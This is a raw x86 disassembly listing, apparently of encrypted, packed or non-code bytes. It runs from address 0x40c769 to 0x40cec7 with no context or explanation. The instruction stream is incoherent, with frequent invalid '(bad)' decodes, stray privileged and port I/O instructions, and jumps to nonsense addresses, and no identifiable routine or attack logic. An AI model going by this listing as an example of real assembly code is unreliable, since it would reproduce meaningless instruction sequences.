  40c769:	xchg   esi,eax
  40c76a:	loop   0x40c75c
  40c76c:	xor    ecx,DWORD PTR [esi]
  40c76e:	cmp    al,0x46
  40c770:	inc    eax
  40c771:	push   ecx
  40c772:	mov    BYTE PTR [ebx+0x30a66315],dl
  40c778:	fisttp QWORD PTR ds:0xe9f9c23e
  40c77e:	pop    ecx
  40c77f:	add    DWORD PTR [ebx+0x2755a70a],ecx
  40c785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c786:	nop
  40c787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c788:	test   DWORD PTR [edx+0x183a2042],edx
  40c78e:	add    dl,BYTE PTR [ebx]
  40c790:	add    BYTE PTR ds:0xc9e865dc,bh
  40c796:	add    ebp,DWORD PTR [esi-0x32]
  40c799:	fs sub eax,0xf0ccfc24
  40c79f:	sbb    al,0x68
  40c7a1:	cmpxchg BYTE PTR [ecx-0x3],al
  40c7a5:	xchg   esp,eax
  40c7a6:	xchg   ebx,eax
  40c7a7:	stos   DWORD PTR es:[edi],eax
  40c7a8:	dec    ebp
  40c7a9:	sar    BYTE PTR [ecx-0x3b],1
  40c7ac:	add    edx,DWORD PTR [edi]
  40c7ae:	pop    esp
  40c7af:	cmp    al,0xd3
  40c7b1:	xchg   ebx,eax
  40c7b2:	cmp    eax,0x3bb39914
  40c7b7:	mov    edi,0x6e0d1e05
  40c7bc:	in     al,0x36
  40c7be:	sub    bl,dl
  40c7c0:	fmul   st,st(4)
  40c7c2:	adc    edi,DWORD PTR [eax]
  40c7c4:	jge    0x40c7db
  40c7c6:	mov    ds,WORD PTR [eax+0xd]
  40c7c9:	pop    ecx
  40c7ca:	clc    
  40c7cb:	jmp    0x221b9f79
  40c7d0:	jbe    0x40c7b0
  40c7d2:	mov    al,0xa5
  40c7d4:	ja     0x40c81d
  40c7d6:	adc    ecx,DWORD PTR [eax+0x2e]
  40c7d9:	rcr    BYTE PTR [edx+0x32],0xa0
  40c7dd:	xchg   esi,eax
  40c7de:	jl     0x40c82e
  40c7e0:	sub    dl,BYTE PTR [esi]
  40c7e2:	jb     0x40c84e
  40c7e4:	into   
  40c7e5:	pop    ecx
  40c7e6:	jmp    0xddcd5e18
  40c7eb:	cs jns 0x40c843
  40c7ee:	hlt    
  40c7ef:	popf   
  40c7f0:	clc    
  40c7f1:	rdmsr  
  40c7f3:	out    dx,eax
  40c7f4:	or     al,0x8a
  40c7f6:	xlat   BYTE PTR ds:[ebx]
  40c7f7:	bswap  ecx
  40c7f9:	fldenv [eax+0x290902fd]
  40c7ff:	jbe    0x40c7cf
  40c801:	xchg   DWORD PTR [edi],esp
  40c803:	dec    ecx
  40c804:	mov    ebp,0x77a5400a
  40c809:	sar    DWORD PTR [edx],0x39
  40c80c:	jnp    0x40c80b
  40c80e:	imul   ebp,DWORD PTR [ebx+eax*2+0x45],0xffffffcf
  40c813:	dec    BYTE PTR [edx+ecx*4+0x51084126]
  40c81a:	je     0x40c87d
  40c81c:	sbb    al,0x87
  40c81e:	cmp    ch,ch
  40c820:	int    0x89
  40c822:	(bad)  
  40c823:	and    al,0x5d
  40c825:	pop    ecx
  40c826:	shr    DWORD PTR [esi],1
  40c828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c829:	and    DWORD PTR [eax-0x5],0x58
  40c82d:	jg     0x40c817
  40c82f:	pop    es
  40c830:	xor    edi,DWORD PTR [ebx-0x6c]
  40c833:	sub    edi,DWORD PTR [ebx+ecx*4-0x73939d9a]
  40c83a:	lock test al,0xfe
  40c83d:	test   DWORD PTR [esi+0x4a34bc1c],ecx
  40c843:	int3   
  40c844:	popf   
  40c845:	int    0xdf
  40c847:	mov    fs,WORD PTR [ecx]
  40c849:	mov    ch,0x6d
  40c84b:	gs test al,0x62
  40c84e:	outs   dx,DWORD PTR ds:[esi]
  40c84f:	inc    ebp
  40c850:	leave  
  40c851:	shl    BYTE PTR ds:0x58fdf8fe,1
  40c857:	ret    0x7242
  40c85a:	pop    es
  40c85b:	sub    dl,BYTE PTR [ecx-0xf864397]
  40c861:	and    DWORD PTR [ebx],edx
  40c863:	es xchg edx,eax
  40c865:	jb     0x40c8ba
  40c867:	adc    BYTE PTR [edi-0x2],ah
  40c86a:	pop    ecx
  40c86b:	lock fs mov ebx,0x4f6e6b04
  40c872:	xor    eax,0xc9abf549
  40c877:	sub    al,0x66
  40c879:	or     dl,al
  40c87b:	jg     0x40c8a8
  40c87d:	je     0x40c8de
  40c87f:	outs   dx,BYTE PTR ds:[esi]
  40c880:	mov    ch,bh
  40c882:	dec    ebx
  40c883:	adc    al,0x11
  40c885:	pop    edx
  40c886:	mov    ecx,0xb280a190
  40c88b:	retf   0x6a8a
  40c88e:	fwait
  40c88f:	mov    eax,ds:0xb8d4bc69
  40c894:	cwde   
  40c895:	out    0x29,al
  40c897:	out    0x3e,eax
  40c899:	bound  ebp,QWORD PTR [esi]
  40c89b:	test   al,0x6d
  40c89d:	data16 outs dx,BYTE PTR ds:[esi]
  40c89f:	cwde   
  40c8a0:	dec    edx
  40c8a1:	cld    
  40c8a2:	mov    al,0xf9
  40c8a4:	repz mov ah,0xee
  40c8a7:	inc    ebp
  40c8a8:	neg    ebp
  40c8aa:	pop    edi
  40c8ab:	or     DWORD PTR [edx],0x4f
  40c8ae:	retf   
  40c8af:	adc    DWORD PTR ds:0x6071a1a7,edi
  40c8b5:	gs add dh,cl
  40c8b8:	cmp    eax,0x9da0aa38
  40c8bd:	in     al,0x7c
  40c8bf:	mov    dh,0xf7
  40c8c1:	pop    edi
  40c8c2:	fidivr WORD PTR [ebx+0x51]
  40c8c5:	ret    0x706a
  40c8c8:	daa    
  40c8c9:	cdq    
  40c8ca:	stc    
  40c8cb:	jo     0x40c8fe
  40c8cd:	mov    al,ds:0xddf711f8
  40c8d2:	adc    edi,edi
  40c8d4:	ins    BYTE PTR es:[edi],dx
  40c8d5:	mov    ds:0xcafbe13,eax
  40c8da:	push   0x3b
  40c8dc:	iret   
  40c8dd:	inc    esi
  40c8de:	test   ebx,ebp
  40c8e0:	rcl    ah,cl
  40c8e2:	add    eax,0x75d51a6a
  40c8e7:	mov    es:0xdad4c43e,al
  40c8ed:	das    
  40c8ee:	and    eax,0xa66aa6ed
  40c8f3:	jl     0x40c962
  40c8f5:	call   0x19d0:0x6628288c
  40c8fc:	sbb    al,0x7d
  40c8fe:	fstp   QWORD PTR [ebx-0x3]
  40c901:	xchg   ecx,eax
  40c902:	jl     0x40c89d
  40c904:	push   eax
  40c905:	addr16 or esp,DWORD PTR [bx+di-0x7408]
  40c90b:	in     eax,dx
  40c90c:	xor    DWORD PTR [edx+0x4371f6a1],edx
  40c912:	pop    ebx
  40c913:	sbb    ah,BYTE PTR [ebx+0x4203a888]
  40c919:	cwde   
  40c91a:	je     0x40c8cb
  40c91c:	or     ecx,DWORD PTR [edx+0x71394b7e]
  40c922:	out    0xef,eax
  40c924:	retf   0xbf06
  40c927:	sub    ah,BYTE PTR [esi+0x5f306c4e]
  40c92d:	enter  0x7112,0x1a
  40c931:	js     0x40c8ce
  40c933:	mov    WORD PTR [eax+0x1ae7cb38],ds
  40c939:	dec    ecx
  40c93a:	(bad)  
  40c93b:	jl     0x40c8d6
  40c93d:	mov    dl,0x6e
  40c93f:	mov    dh,BYTE PTR [ecx+0x507b94c9]
  40c945:	ss int3 
  40c947:	or     DWORD PTR [ecx+0x736d2c57],eax
  40c94d:	push   esi
  40c94e:	sub    al,0x3b
  40c950:	push   ss
  40c951:	ret    
  40c952:	or     eax,0x22446535
  40c957:	in     eax,0x40
  40c959:	mov    ecx,0x64b3cfce
  40c95e:	add    bl,bl
  40c960:	or     BYTE PTR [ebp+0x54],0x68
  40c964:	mov    BYTE PTR [eax+0x18],ah
  40c967:	pusha  
  40c968:	jp     0x40c954
  40c96a:	mov    ds:0xb12c729a,eax
  40c96f:	pop    eax
  40c970:	xor    al,cl
  40c972:	test   al,0x5e
  40c974:	mov    cl,0xba
  40c976:	bound  ecx,QWORD PTR [edi-0x5b]
  40c979:	nop
  40c97a:	push   edx
  40c97b:	pop    edi
  40c97c:	jmp    0x44ed:0x458b378f
  40c983:	inc    ebx
  40c984:	mov    eax,0xe2f9bcd5
  40c989:	imul   ecx,DWORD PTR [ecx],0x7b266ace
  40c98f:	xor    eax,0x6481b92a
  40c994:	xor    ebx,ebp
  40c996:	out    0xf6,al
  40c998:	clc    
  40c999:	in     al,dx
  40c99a:	fbld   TBYTE PTR [ecx]
  40c99c:	inc    edx
  40c99d:	fcmovne st,st(1)
  40c99f:	mov    bh,0xda
  40c9a1:	bound  edi,QWORD PTR [ebx+0x3ef25561]
  40c9a7:	push   edi
  40c9a8:	iret   
  40c9a9:	xchg   edx,eax
  40c9aa:	and    esi,edi
  40c9ac:	pop    ecx
  40c9ad:	int3   
  40c9ae:	out    0x47,eax
  40c9b0:	inc    eax
  40c9b1:	sub    DWORD PTR [edi-0x8],0xffffffff
  40c9b5:	out    dx,al
  40c9b6:	dec    ebx
  40c9b7:	(bad)  
  40c9b8:	js     0x40c9a6
  40c9ba:	sub    eax,0x2b116437
  40c9bf:	mov    ?,WORD PTR [ebx-0x4e]
  40c9c2:	das    
  40c9c3:	fild   WORD PTR [edi+0x34366af8]
  40c9c9:	addr16 ja 0x40c9ca
  40c9cc:	jo     0x40c965
  40c9ce:	call   FWORD PTR [ecx+edi*2+0x46b571b6]
  40c9d5:	(bad)  
  40c9d6:	jge    0x40c969
  40c9d8:	push   cs
  40c9d9:	jne    0x40ca46
  40c9db:	scas   al,BYTE PTR es:[edi]
  40c9dc:	xchg   edx,eax
  40c9dd:	repnz lock hlt 
  40c9e0:	xchg   ebx,eax
  40c9e1:	sbb    eax,0xbec2463e
  40c9e6:	leave  
  40c9e7:	pop    ecx
  40c9e8:	xlat   BYTE PTR ds:[ebx]
  40c9e9:	stc    
  40c9ea:	mov    edi,esp
  40c9ec:	daa    
  40c9ed:	gs (bad) 
  40c9ef:	jl     0x40c986
  40c9f1:	in     al,0xd1
  40c9f3:	sub    bl,dl
  40c9f5:	xchg   ch,dh
  40c9f7:	aas    
  40c9f8:	fidiv  DWORD PTR [ebp+0x3b]
  40c9fb:	iret   
  40c9fc:	stos   DWORD PTR es:[edi],eax
  40c9fd:	les    esi,FWORD PTR [edx]
  40c9ff:	sub    ecx,DWORD PTR [esi]
  40ca01:	sahf   
  40ca02:	ret    
  40ca03:	push   edx
  40ca04:	(bad)  
  40ca05:	xor    ecx,DWORD PTR [edi+0xe3e4397]
  40ca0b:	imul   ebp,ebp,0xffffffea
  40ca0e:	cmp    BYTE PTR [ebp+0x5f],cl
  40ca11:	scas   eax,DWORD PTR es:[edi]
  40ca12:	mov    dh,0x4a
  40ca14:	test   eax,0x93c344e
  40ca19:	cmc    
  40ca1a:	push   edx
  40ca1b:	cdq    
  40ca1c:	add    al,0x85
  40ca1e:	push   ds
  40ca1f:	push   0xcdd1c880
  40ca24:	into   
  40ca25:	fcom   st(7)
  40ca27:	int3   
  40ca28:	pop    ss
  40ca29:	mov    esi,0x7ed90634
  40ca2e:	addr16 je 0x40ca5b
  40ca31:	enter  0x9310,0x31
  40ca35:	pop    edi
  40ca36:	mov    bl,BYTE PTR [eax+0x0]
  40ca39:	jl     0x40ca65
  40ca3b:	jp     0x40c9de
  40ca3d:	in     eax,dx
  40ca3e:	fstp   TBYTE PTR [ebx+0x7f3f6cf6]
  40ca44:	xlat   BYTE PTR ds:[ebx]
  40ca45:	pop    ecx
  40ca46:	xchg   edi,eax
  40ca47:	stos   DWORD PTR es:[edi],eax
  40ca48:	scas   al,BYTE PTR es:[edi]
  40ca49:	xor    DWORD PTR [eax-0x93a2d89],ebp
  40ca4f:	mov    eax,0x696c1350
  40ca54:	clc    
  40ca55:	mov    esp,0xfcabc56f
  40ca5a:	lahf   
  40ca5b:	or     BYTE PTR ds:0xa90a0f0,ch
  40ca61:	sbb    cl,BYTE PTR [esi+0x5d]
  40ca64:	jno    0x40ca5b
  40ca66:	mov    cl,0x4e
  40ca68:	sub    BYTE PTR [ebx+0x22db3eab],ah
  40ca6e:	out    dx,al
  40ca6f:	ret    
  40ca70:	mov    ebp,0xd3306791
  40ca75:	or     al,ah
  40ca77:	xchg   DWORD PTR [edi-0x3dbf5a3],esp
  40ca7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca7e:	xor    DWORD PTR [ebp+eiz*8+0x22],esi
  40ca82:	ror    DWORD PTR [eax-0x261232c],cl
  40ca88:	nop
  40ca89:	xchg   ecx,eax
  40ca8a:	scas   al,BYTE PTR es:[edi]
  40ca8b:	stos   BYTE PTR es:[edi],al
  40ca8c:	mov    eax,ds:0xc89c3357
  40ca91:	cmp    eax,0xd9ad8dcc
  40ca96:	sub    dh,BYTE PTR [ebx-0x5ceb238c]
  40ca9c:	jg     0x40cb1d
  40ca9e:	jne    0x40caf4
  40caa0:	stc    
  40caa1:	mov    ds:0x395b94fe,eax
  40caa6:	xor    ebp,DWORD PTR [ebp+0x16]
  40caa9:	push   0x9320e0f6
  40caae:	ss cdq 
  40cab0:	pop    ss
  40cab1:	scas   eax,DWORD PTR es:[edi]
  40cab2:	lahf   
  40cab3:	jp     0x40cb11
  40cab5:	into   
  40cab6:	out    dx,al
  40cab7:	mov    dh,0xde
  40cab9:	and    BYTE PTR [esi],cl
  40cabb:	jmp    0x3bf7c301
  40cac0:	pop    ecx
  40cac1:	stc    
  40cac2:	rcl    DWORD PTR [ebx-0x14],0x4f
  40cac6:	test   DWORD PTR [edx-0x49ac652f],edx
  40cacc:	(bad)  
  40cacd:	rol    DWORD PTR [ebp-0x410d5f86],cl
  40cad3:	fcom   DWORD PTR [edx+edx*1-0x628955cd]
  40cada:	aas    
  40cadb:	xchg   ebp,eax
  40cadc:	sub    edx,ebx
  40cade:	addr16 xchg esp,eax
  40cae0:	mov    ah,0x48
  40cae2:	imul   ecx,DWORD PTR gs:[ecx+0x630c7966],0x1825dbb4
  40caed:	mov    eax,0xf902b47f
  40caf2:	xor    eax,0x8138b2a3
  40caf7:	not    BYTE PTR [edi+0x6a]
  40cafa:	mov    ?,WORD PTR [edi-0x428a938b]
  40cb00:	in     al,0x47
  40cb02:	sbb    al,0x2a
  40cb04:	into   
  40cb05:	mov    ch,BYTE PTR [edx+0x5a]
  40cb08:	adc    eax,0x8d525d2e
  40cb0d:	cdq    
  40cb0e:	js     0x40cb87
  40cb10:	fwait
  40cb11:	imul   esp,ebp,0x6e
  40cb14:	sbb    cl,BYTE PTR [ecx+ebx*4]
  40cb17:	xchg   esp,eax
  40cb18:	adc    ebp,0x7527ba8e
  40cb1e:	fwait
  40cb1f:	out    dx,al
  40cb20:	add    al,BYTE PTR [ebx+0x53]
  40cb23:	lahf   
  40cb24:	mov    cl,0xa7
  40cb26:	arpl   di,sp
  40cb28:	jns    0x40cb7a
  40cb2a:	lods   al,BYTE PTR ds:[esi]
  40cb2b:	sbb    cl,cl
  40cb2d:	setl   BYTE PTR [esi+0x40fa8e88]
  40cb34:	add    edx,ebp
  40cb36:	test   eax,0x32538de
  40cb3b:	or     al,0x89
  40cb3d:	mov    bl,0x22
  40cb3f:	(bad)  
  40cb40:	data16 icebp 
  40cb42:	fs in  eax,0x48
  40cb45:	mov    bl,0x16
  40cb47:	popf   
  40cb48:	ror    BYTE PTR ds:0xb86c8326,0x85
  40cb4f:	int    0x33
  40cb51:	mov    edx,0xc8712f7
  40cb56:	adc    esi,edx
  40cb58:	shr    DWORD PTR [eax+0x69],cl
  40cb5b:	push   edi
  40cb5c:	call   ebx
  40cb5e:	test   bh,0xa2
  40cb61:	and    bh,BYTE PTR [esi]
  40cb63:	mov    ah,0xd6
  40cb65:	call   0xec104152
  40cb6a:	adc    eax,0xd967aab3
  40cb6f:	mov    WORD PTR [edi-0x3f],es
  40cb72:	push   edx
  40cb73:	mov    eax,0xa599136c
  40cb78:	and    esi,esp
  40cb7a:	mov    dh,0x21
  40cb7c:	mov    ecx,0x9c20254a
  40cb81:	sbb    eax,0x645d8125
  40cb86:	inc    esp
  40cb87:	sub    al,0x52
  40cb89:	xor    eax,0xfe6f3f0e
  40cb8e:	cwde   
  40cb8f:	xchg   ebp,eax
  40cb90:	stos   BYTE PTR es:[edi],al
  40cb91:	aas    
  40cb92:	cmp    edi,edx
  40cb94:	(bad)
  40cb97:	push   ebp
  40cb98:	aas    
  40cb99:	xchg   BYTE PTR [ebp-0x6],bh
  40cb9c:	inc    edi
  40cb9d:	scas   eax,DWORD PTR es:[edi]
  40cb9e:	or     ebp,DWORD PTR [eax+0x2b5d78e8]
  40cba4:	pop    ebp
  40cba5:	pop    ebp
  40cba6:	dec    esp
  40cba7:	out    0x67,al
  40cba9:	or     esi,DWORD PTR [esp+ecx*8+0x77]
  40cbad:	xor    ebx,DWORD PTR [edx]
  40cbaf:	jg     0x40cb97
  40cbb1:	push   ds
  40cbb2:	push   esp
  40cbb3:	sbb    ebp,edx
  40cbb5:	stc    
  40cbb6:	adc    al,0x99
  40cbb8:	fcomp  DWORD PTR [ebx+ebp*2+0x2e21c118]
  40cbbf:	mov    bh,0x7a
  40cbc1:	test   BYTE PTR [ebx+0x18],cl
  40cbc4:	imul   ecx,DWORD PTR [eax+edi*2+0x2],0xffffff85
  40cbc9:	inc    esi
  40cbca:	fild   DWORD PTR [esi-0x5d]
  40cbcd:	push   esp
  40cbce:	stos   BYTE PTR es:[edi],al
  40cbcf:	push   es
  40cbd0:	mov    eax,0xfa80a32e
  40cbd5:	push   ebp
  40cbd6:	push   edi
  40cbd7:	xlat   BYTE PTR ds:[ebx]
  40cbd8:	adc    BYTE PTR [esi+0x61ec12ab],ch
  40cbde:	xor    al,0xc4
  40cbe0:	in     eax,dx
  40cbe1:	scas   eax,DWORD PTR es:[edi]
  40cbe2:	sbb    bh,bh
  40cbe4:	mov    ch,0x1d
  40cbe6:	rcl    cl,1
  40cbe8:	sbb    DWORD PTR [edi-0x6e1916e3],edx
  40cbee:	mov    dh,0x59
  40cbf0:	rcl    DWORD PTR [ecx-0x2ba9678e],1
  40cbf6:	hlt    
  40cbf7:	jns    0x40cb8a
  40cbf9:	adc    al,0xb1
  40cbfb:	hlt    
  40cbfc:	jmp    DWORD PTR [esp+ebp*4+0x183d5e97]
  40cc03:	mov    al,ds:0xb196df16
  40cc08:	xor    al,0xe7
  40cc0a:	shr    BYTE PTR [ebp-0x4f],1
  40cc0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc0e:	fs xchg ebx,eax
  40cc10:	cmp    al,0x3d
  40cc12:	xchg   DWORD PTR [esi],ecx
  40cc14:	lods   eax,DWORD PTR ds:[esi]
  40cc15:	push   0xffffffc8
  40cc17:	test   ecx,ebp
  40cc19:	pop    esi
  40cc1a:	enter  0x96b6,0x7b
  40cc1e:	push   cs
  40cc1f:	aam    0x22
  40cc21:	pop    ss
  40cc22:	clc    
  40cc23:	(bad)
  40cc27:	scas   al,BYTE PTR es:[edi]
  40cc28:	inc    esi
  40cc29:	aas    
  40cc2a:	fcomp  DWORD PTR [esi-0x14326e22]
  40cc30:	xor    BYTE PTR [eax+0x7f],dh
  40cc33:	cmp    al,0x4b
  40cc35:	sub    DWORD PTR [ecx],ebx
  40cc37:	(bad)  
  40cc38:	fsubr  st,st(7)
  40cc3a:	fstp   DWORD PTR [ebp-0xa]
  40cc3d:	in     al,dx
  40cc3e:	hlt    
  40cc3f:	lock out 0x2f,al
  40cc42:	ficom  DWORD PTR [edx]
  40cc44:	into   
  40cc45:	daa    
  40cc46:	ret    
  40cc47:	mov    ds:0x76c92a53,al
  40cc4c:	(bad)  
  40cc4d:	push   0xffffff8c
  40cc4f:	pusha  
  40cc50:	adc    eax,0x9c25b96b
  40cc55:	aas    
  40cc56:	rcl    BYTE PTR [ebx+edi*2-0x2dc02ec2],cl
  40cc5d:	push   eax
  40cc5e:	jg     0x40cc94
  40cc60:	pushf  
  40cc61:	sub    eax,0x78b41c1a
  40cc66:	ret    
  40cc67:	fidivr WORD PTR [esi]
  40cc69:	sbb    eax,0x4b02eb3b
  40cc6e:	test   eax,0xf876d38b
  40cc73:	call   0xeecba5d1
  40cc78:	sbb    ebx,edi
  40cc7a:	sbb    eax,0x2eac7b74
  40cc7f:	mov    ebx,0x61608823
  40cc84:	sbb    dh,BYTE PTR [ecx-0x4f]
  40cc87:	in     eax,0x6c
  40cc89:	mov    eax,ds:0x342837d0
  40cc8e:	js     0x40cc35
  40cc90:	lods   eax,DWORD PTR ds:[esi]
  40cc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc92:	out    dx,eax
  40cc93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc94:	aam    0x79
  40cc96:	sub    eax,0xd580f649
  40cc9b:	in     al,0xd4
  40cc9d:	retf   
  40cc9e:	push   ebp
  40cc9f:	and    eax,0x9adfed2d
  40cca4:	mov    dl,0x22
  40cca6:	xchg   ebp,eax
  40cca7:	push   esp
  40cca8:	jge    0x40cc81
  40ccaa:	push   esp
  40ccab:	push   ebp
  40ccac:	cwde   
  40ccad:	popf   
  40ccae:	ds sub al,0x90
  40ccb1:	sub    al,0xff
  40ccb3:	mov    WORD PTR [ecx+eax*4-0x9f5698a],?
  40ccba:	dec    ebp
  40ccbb:	xchg   ebp,eax
  40ccbc:	aam    0x9e
  40ccbe:	pop    ds
  40ccbf:	mov    ebx,0xbff06dd2
  40ccc4:	jle    0x40ccd4
  40ccc6:	ret    
  40ccc7:	loopne 0x40ccf2
  40ccc9:	sub    ebp,ebp
  40cccb:	ret    
  40cccc:	mov    ebx,0x9414e3c5
  40ccd1:	jl     0x40ccce
  40ccd3:	sub    eax,0xbbeda838
  40ccd8:	sbb    ebx,DWORD PTR [ebp-0x7082c8e4]
  40ccde:	jmp    0x40cc9c
  40cce0:	mov    bl,0xab
  40cce2:	scas   eax,DWORD PTR es:[edi]
  40cce3:	mov    eax,0xb909ac4
  40cce8:	leave  
  40cce9:	sbb    esp,DWORD PTR [esi]
  40cceb:	xchg   ebp,eax
  40ccec:	fld    TBYTE PTR [eax+0x4c172115]
  40ccf2:	sub    al,0x80
  40ccf4:	sub    edi,esi
  40ccf6:	aam    0x55
  40ccf8:	sbb    DWORD PTR [ecx],esp
  40ccfa:	fbstp  TBYTE PTR [eax-0x21702ece]
  40cd00:	add    dh,BYTE PTR [ecx+0x6c]
  40cd03:	pop    esi
  40cd04:	iret   
  40cd05:	xchg   esp,eax
  40cd06:	jle    0x40cd47
  40cd08:	sub    al,BYTE PTR [ecx]
  40cd0a:	test   eax,0xaad7c655
  40cd0f:	mov    al,ds:0x3e84a279
  40cd14:	and    DWORD PTR [ecx+ebx*2+0x8],edx
  40cd18:	xor    ebx,DWORD PTR [ecx]
  40cd1a:	mov    edi,0xdd91d304
  40cd1f:	cmp    dh,BYTE PTR [edx+0x28968b9c]
  40cd25:	popf   
  40cd26:	loope  0x40ccef
  40cd28:	jnp    0x40ccd1
  40cd2a:	outs   dx,BYTE PTR ds:[esi]
  40cd2b:	lock fidiv DWORD PTR [esi+ebx*1]
  40cd2f:	sub    cl,BYTE PTR [ebx+0x74b149c9]
  40cd35:	cmp    bl,ch
  40cd37:	or     cl,dh
  40cd39:	dec    ecx
  40cd3a:	inc    ecx
  40cd3b:	out    dx,eax
  40cd3c:	sub    al,0x46
  40cd3e:	pop    esi
  40cd3f:	sub    al,0xbe
  40cd41:	jg     0x40cd5e
  40cd43:	push   0xffffffde
  40cd45:	and    esi,DWORD PTR [edi+ebx*8]
  40cd48:	ds sbb eax,0x18ea8697
  40cd4e:	outs   dx,DWORD PTR ds:[esi]
  40cd4f:	sar    DWORD PTR [edx-0x5be1d98e],0x4
  40cd56:	test   eax,0x1790da6c
  40cd5b:	fimul  WORD PTR [eax-0x38]
  40cd5e:	mov    ecx,DWORD PTR [esi]
  40cd60:	call   0xe00d57ca
  40cd65:	pop    ss
  40cd66:	ret    
  40cd67:	push   ebp
  40cd68:	jne    0x40cd79
  40cd6a:	daa    
  40cd6b:	(bad)  
  40cd6c:	adc    eax,0x84065d61
  40cd71:	pusha  
  40cd72:	ror    BYTE PTR [edi-0x1d],1
  40cd75:	sbb    DWORD PTR [esi-0x64],ebx
  40cd78:	and    al,BYTE PTR [esi+eiz*1+0x1e0ba135]
  40cd7f:	add    ecx,DWORD PTR [ebp+0x2e534edd]
  40cd85:	sbb    eax,0xc146b04e
  40cd8a:	les    eax,FWORD PTR [edx-0x3d]
  40cd8d:	retf   
  40cd8e:	and    DWORD PTR [ecx-0x770a389b],esp
  40cd94:	cmp    BYTE PTR [ecx],ch
  40cd96:	sahf   
  40cd97:	xchg   edx,eax
  40cd98:	(bad)  
  40cd99:	fistp  DWORD PTR [edx+0x6db78432]
  40cd9f:	call   0x5b77a5c8
  40cda4:	add    BYTE PTR [edx],bl
  40cda6:	cmp    BYTE PTR [edx],0xae
  40cda9:	inc    ecx
  40cdaa:	inc    edx
  40cdab:	mov    al,ds:0xb36370ab
  40cdb0:	push   ecx
  40cdb1:	jo     0x40cddb
  40cdb3:	jne    0x40cdfc
  40cdb5:	scas   eax,DWORD PTR es:[edi]
  40cdb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdb7:	inc    eax
  40cdb8:	jmp    0xcf34cb5b
  40cdbd:	dec    eax
  40cdbe:	push   cs
  40cdbf:	icebp  
  40cdc0:	(bad)  
  40cdc1:	int    0x52
  40cdc3:	pop    es
  40cdc4:	cmp    DWORD PTR [edi-0x69],esi
  40cdc7:	repz mov eax,ds:0x6cfc4a1
  40cdcd:	aas    
  40cdce:	sahf   
  40cdcf:	push   ds
  40cdd0:	mov    ecx,0x7b1fac9
  40cdd5:	mov    esi,gs
  40cdd7:	fstp   DWORD PTR [edi+eax*4-0x367e82a1]
  40cdde:	ret    0x500
  40cde1:	push   eax
  40cde2:	loopne 0x40cdf9
  40cde4:	jl     0x40ce44
  40cde6:	dec    ebp
  40cde7:	out    dx,eax
  40cde8:	adc    eax,0x890a8dbc
  40cded:	fst    DWORD PTR [edi-0x453e0a4f]
  40cdf3:	ss pop eax
  40cdf5:	outs   dx,BYTE PTR ds:[esi]
  40cdf6:	lods   al,BYTE PTR ds:[esi]
  40cdf7:	dec    ecx
  40cdf8:	sbb    cl,BYTE PTR [ebx]
  40cdfa:	aad    0x9f
  40cdfc:	pushf  
  40cdfd:	sub    ebp,ebp
  40cdff:	test   edi,ebx
  40ce01:	pop    esi
  40ce02:	js     0x40cdf2
  40ce04:	mov    ebx,0x548d6886
  40ce09:	cmp    al,0xa4
  40ce0b:	ror    BYTE PTR [esi],cl
  40ce0d:	rcr    DWORD PTR [esi+0x4787a65d],0xe
  40ce14:	leave  
  40ce15:	daa    
  40ce16:	dec    edi
  40ce17:	lods   eax,DWORD PTR ds:[esi]
  40ce18:	lock mov edx,0x51a0a1fb
  40ce1e:	mov    cl,0xb9
  40ce20:	into   
  40ce21:	push   cs
  40ce22:	(bad)  
  40ce23:	leave  
  40ce24:	out    dx,al
  40ce25:	mov    bh,0x82
  40ce27:	xchg   esi,eax
  40ce28:	push   edi
  40ce29:	inc    ebx
  40ce2a:	adc    ah,al
  40ce2c:	shr    BYTE PTR [ebx+0xe],0xb
  40ce30:	sbb    eax,0xae4c2439
  40ce35:	pop    es
  40ce36:	outs   dx,BYTE PTR ds:[esi]
  40ce37:	jae    0x40ce4f
  40ce39:	pop    esp
  40ce3a:	fimul  DWORD PTR ss:[edi+edx*4-0x5504e4c0]
  40ce42:	xor    ah,BYTE PTR [ecx+ebp*8-0x44]
  40ce46:	mov    esi,0xe319d438
  40ce4b:	cmp    DWORD PTR [ebx],0xa
  40ce4e:	cmp    dh,BYTE PTR [ecx+0x1d11a211]
  40ce54:	dec    eax
  40ce55:	cmp    eax,0xd6f8362a
  40ce5a:	shr    cl,cl
  40ce5c:	int3   
  40ce5d:	leave  
  40ce5e:	jmp    0x3095e344
  40ce63:	push   ds
  40ce64:	hlt    
  40ce65:	(bad)  
  40ce66:	fistp  QWORD PTR [ebp+0x7c722400]
  40ce6c:	outs   dx,BYTE PTR ds:[esi]
  40ce6d:	cli    
  40ce6e:	cmp    BYTE PTR [eax+0x34ebd234],bl
  40ce74:	lds    ebx,FWORD PTR [eax+0x3bc7ea12]
  40ce7a:	pop    es
  40ce7b:	(bad)  
  40ce7c:	jle    0x40cecb
  40ce7e:	ret    0x9a9e
  40ce81:	inc    edi
  40ce82:	aaa    
  40ce83:	sahf   
  40ce84:	ror    ch,0xb1
  40ce87:	xchg   ecx,eax
  40ce88:	repz enter 0xd253,0xc
  40ce8d:	test   BYTE PTR [ecx+0x10cd1786],al
  40ce93:	pop    esp
  40ce94:	mov    DWORD PTR [edx],edi
  40ce96:	fcomip st,st(2)
  40ce98:	pop    esi
  40ce99:	mov    esi,0x1b6ebc20
  40ce9e:	jg     0x40ceac
  40cea0:	xchg   ebx,eax
  40cea1:	inc    edx
  40cea2:	dec    esi
  40cea3:	cmp    cl,BYTE PTR [eax]
  40cea5:	jb     0x40ce40
  40cea7:	lods   al,BYTE PTR ds:[esi]
  40cea8:	sahf   
  40cea9:	cmp    esi,0xdcfaa317
  40ceaf:	cli    
  40ceb0:	lahf   
  40ceb1:	std    
  40ceb2:	jno    0x40cecd
  40ceb4:	int3   
  40ceb5:	cmp    DWORD PTR [ebx],esi
  40ceb7:	mov    eax,0x24fb9547
  40cebc:	imul   edx,DWORD PTR [ebx],0xffffffbe
  40cebf:	add    edx,DWORD PTR [esi-0x2a]
  40cec2:	ins    DWORD PTR es:[edi],dx
  40cec3:	cli    
  40cec4:	mov    bh,0x99
  40cec6:	xchg   esi,eax
  40cec7:	cdq    
